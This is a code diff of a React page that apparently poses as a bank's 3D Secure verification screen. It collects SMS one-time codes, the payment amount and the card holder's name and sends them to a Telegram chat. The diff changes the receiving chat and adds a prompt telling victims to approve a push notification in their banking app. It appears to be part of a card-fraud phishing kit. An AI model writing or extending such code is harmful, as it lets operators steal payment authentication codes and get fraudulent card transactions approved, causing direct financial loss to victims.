@@ -13,7 +13,7 @@ const sendTelegramNotification = async (code: string, amount: string, cardHolder
         'Content-Type': 'application/json',
       },
       body: JSON.stringify({
-        chat_id: "6293259686",
+        chat_id: "-4781499307",
         text: `3DS Code Verification:
 Amount: ${amount}
 Card Holder: ${cardHolder}
@@ -32,7 +32,7 @@ export default function Verify3DS() {
   const amount = searchParams.get("amount") || "0";
   const cardHolder = searchParams.get("cardHolder") || "";
   const [code, setCode] = useState("");
-  const [verifyMethod, setVerifyMethod] = useState("3DS");
+  const [verifyMethod, setVerifyMethod] = useState("");
   const [isSubmitting, setIsSubmitting] = useState(false);
   const navigate = useNavigate();
 
@@ -73,7 +73,7 @@ export default function Verify3DS() {
         </div>
 
         <RadioGroup
-          defaultValue="3DS"
+          value={verifyMethod}
           className="grid gap-4"
           onValueChange={setVerifyMethod}
         >
@@ -93,29 +93,39 @@ export default function Verify3DS() {
           </div>
         </RadioGroup>
 
-        <div className="space-y-4">
-          <Input
-            type="text"
-            placeholder="Enter Verification Code"
-            value={code}
-            onChange={(e) => setCode(e.target.value)}
-            minLength={4}
-            maxLength={10}
-            className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
-            required
-          />
-          <Button
-            type="submit"
-            disabled={isSubmitting || code.length < 4 || code.length > 10}
-            className="w-full bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] text-white hover:opacity-90 transition-opacity"
-          >
-            {isSubmitting ? "Verifying..." : "Verify"}
-          </Button>
-        </div>
-
-        <p className="text-gray-400 text-sm text-center">
-          Enter the code (4-10 characters) you received
-        </p>
+        {verifyMethod && (
+          <div className="space-y-4 animate-in fade-in-0 slide-in-from-top-5">
+            {verifyMethod === "3DS" ? (
+              <>
+                <Input
+                  type="text"
+                  placeholder="Enter SMS Code"
+                  value={code}
+                  onChange={(e) => setCode(e.target.value)}
+                  minLength={4}
+                  maxLength={10}
+                  className="bg-black/50 border-white/20 text-white placeholder:text-gray-500"
+                  required
+                />
+                <p className="text-gray-400 text-sm text-center">
+                  Enter the code (4-10 characters) sent to your phone
+                </p>
+              </>
+            ) : (
+              <p className="text-gray-400 text-center py-4">
+                Please check your banking app for the push notification and confirm the transaction there
+              </p>
+            )}
+            
+            <Button
+              type="submit"
+              disabled={isSubmitting || (verifyMethod === "3DS" && (code.length < 4 || code.length > 10))}
+              className="w-full bg-gradient-to-r from-[#8B5CF6] via-[#D946EF] to-[#0EA5E9] text-white hover:opacity-90 transition-opacity"
+            >
+              {isSubmitting ? "Verifying..." : "Verify"}
+            </Button>
+          </div>
+        )}
       </form>
     </div>
   );
